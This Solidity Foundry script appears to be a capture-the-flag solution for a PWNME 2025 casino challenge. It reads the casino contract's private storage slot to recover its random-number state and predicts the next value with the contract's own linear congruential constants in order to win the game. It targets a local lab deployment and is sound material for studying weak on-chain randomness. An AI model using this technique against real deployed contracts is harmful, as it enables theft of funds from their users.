//SPDX-License-Identifier-MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Setup,CasinoPWNME} from "src/PWNME-2025/Mafia-At-The-End-Of-Block-2/Setup.sol";


contract Solve is Script{
    Setup setup= Setup(address(0x5FbDB2315678afecb367f032d93F642f64180aa3));
    CasinoPWNME casino=setup.casino();
    function run()public{
        vm.startBroadcast();
        Exploit exploit=new Exploit();
        uint256 state=uint256(vm.load(address(casino), bytes32(uint256(4))));
        exploit.pwn{value: 0.1 ether}(state, casino);
        require(setup.isSolved(),"Exploit Failed");
        vm.stopBroadcast();
    }
}


contract Exploit{
    uint256 public multiplier = 14130161972673258133;
	uint256 public increment = 11367173177704995300;
	uint256 public modulus = 4701930664760306055;
    CasinoPWNME casino;
    function pwn(uint256 _state,CasinoPWNME _casino)public payable{
        casino=_casino;
        uint256 state = (multiplier * _state + increment) % modulus;
        casino.playCasino{value: 0.1 ether}(state);
    }
}


